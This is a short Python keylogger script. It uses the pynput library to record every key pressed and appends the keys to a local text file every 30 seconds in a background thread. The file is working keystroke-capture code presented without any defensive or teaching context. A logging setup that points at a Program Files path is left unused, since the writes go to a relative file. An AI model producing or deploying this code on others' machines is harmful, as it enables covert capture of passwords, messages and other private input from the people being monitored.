from pynput.keyboard import Key, Listener
import logging
import time
import threading


log_file_path = r"C:\Program Files\keylogger.txt"


# Initialize logging
logging.basicConfig(filename=log_file_path, level=logging.DEBUG, format=" %(asctime)s - %(message)s")

# Create a log variable
log = []

def on_press(key):
    # Append the key press to the log list
    log.append(str(key))

def log_to_file():
    while True:
        time.sleep(30)  # Wait for 30 seconds
        if log:  # Only log if there are entries
            with open('keylogger.txt', 'a') as f:  # Open the log file in append mode
                for entry in log:
                    f.write(entry + '\n')  # Write each entry in the log to the file
            log.clear()  # Clear the log after writing to the file

# Start a thread for logging to file every 30 seconds
logging_thread = threading.Thread(target=log_to_file)
logging_thread.daemon = True  # Set as a daemon thread
logging_thread.start()


try:
    # Start the listener
    with Listener(on_press=on_press) as listener:
        listener.join()
except KeyboardInterrupt:
    print("Program exited")
